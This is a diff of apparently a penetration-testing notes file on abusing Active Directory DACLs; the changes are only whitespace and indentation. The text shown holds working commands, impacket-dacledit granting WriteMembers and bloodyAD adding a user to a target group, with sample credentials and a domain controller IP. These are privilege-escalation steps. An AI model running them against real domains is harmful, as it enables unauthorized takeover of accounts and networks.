@@ -105,7 +105,7 @@ Become the owner of an object → modify DACL to give themselves GenericAll.
 1. Granting Full Permissions over the target group
 	1. Linux `impacket-dacledit`
 		```bash
-		impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'myuser' -target-dn 'CN=Target Group,CN=Users,DC=ignite,DC=local' 'domain.local'/'mysuer':'myPassword@1' -dc-ip 192.168.1.3
+		impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'myuser' -target-dn 'CN=Target Group,CN=Users,DC=ignite,DC=local' 					  'domain.local'/'mysuer':'myPassword@1' -dc-ip 192.168.1.3
 		```
 	2. Windows `PowerView`
 		```powershell
@@ -115,7 +115,7 @@ Become the owner of an object → modify DACL to give themselves GenericAll.
 		```
 2. Adding a member to this group so we grant/ inherit that group permissions
 	1. Linux `bloodyAD`
-	  ```bash
+	   ```bash
 	   bloodyAD --host "192.168.1.3" -d "domain.local" -u "myuser" -p "myPassword@1" add groupMember "Target Group" "myuser" #we can any user we have control on
 	   ```
 	2. Windows `PowerView`
